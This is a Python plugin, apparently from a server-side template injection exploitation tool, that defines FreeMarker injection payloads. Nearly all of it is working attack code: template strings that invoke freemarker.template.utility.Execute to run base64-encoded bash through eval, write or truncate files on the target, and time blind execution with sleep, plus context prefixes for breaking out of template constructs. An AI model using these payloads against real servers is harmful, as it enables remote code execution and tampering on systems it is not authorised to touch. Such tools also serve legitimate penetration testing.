from utils import rand
from plugins.languages import java


class Freemarker(java.Java):
    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '${{({header[0]}+{header[1]})?c}}',
                'trailer': '${{({trailer[0]}+{trailer[1]})?c}}',
                'test_render': f"""${{{rand.randints[0]}}}<#--{rand.randints[1]}-->${{{rand.randints[2]}}}""",
                'test_render_expected': f'{rand.randints[0]}{rand.randints[2]}'
            },
            'write': {
                'call': 'inject',
                'write': """${{"freemarker.template.utility.Execute"?new()("bash -c {{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}") }}""",
                'truncate': """${{"freemarker.template.utility.Execute"?new()("bash -c {{echo,-n,}}>{path}") }}""",
            },
            # Not using execute here since it's rendered and requires set headers and trailers
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """${{"freemarker.template.utility.Execute"?new()("bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{sleep,{delay}}}") }}"""
            },
            'execute': {
                'call': 'render',
                'execute': """${{"freemarker.template.utility.Execute"?new()("/bin/bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}") }}"""
            }
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure}}}', 'suffix': '', 'closures': java.ctx_closures},
            # This handles <#assign s = %s> and <#if 1 == %s> and <#if %s == 1>
            {'level': 2, 'prefix': '{closure}>', 'suffix': '', 'closures': java.ctx_closures},
            {'level': 5, 'prefix': '-->', 'suffix': '<#--'},
            {'level': 5, 'prefix': '{closure} as a></#list><#list [1] as a>', 'suffix': '', 'closures': java.ctx_closures},
        ])

